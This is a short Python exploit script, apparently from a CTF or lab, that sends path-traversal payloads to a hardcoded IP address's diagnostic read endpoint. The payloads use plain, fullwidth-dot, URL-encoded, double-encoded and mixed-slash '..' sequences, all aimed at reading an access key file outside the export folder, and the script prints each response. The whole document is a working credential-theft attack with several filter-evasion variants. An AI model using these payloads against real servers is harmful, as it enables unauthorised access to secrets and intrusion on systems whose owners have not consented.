import requests

BASE_URL = "http://1.95.51.2:8080"

def check_stage1(path):
    url = f"{BASE_URL}/api/diag/read"
    params = {"path": path}
    try:
        print(f"[*] Trying path: {path}")
        r = requests.get(url, params=params, timeout=5)
        print(f"[*] Status Code: {r.status_code}")
        print(f"[*] Response: {r.text[:300]}") 
    except Exception as e:
        print(f"[!] Error: {e}")

if __name__ == "__main__":
    payloads = [
        r"C:\export\..\..\token\access_key.txt",
        r"C:\export\．．\．．\token\access_key.txt",
        r"C:\export\%2e%2e\%2e%2e\token\access_key.txt",
        r"C:\export\%252e%252e\%252e%252e\token\access_key.txt",
        # Slash confusion
        r"C:\export/../../token/access_key.txt"
    ]
    for p in payloads:
        check_stage1(p)
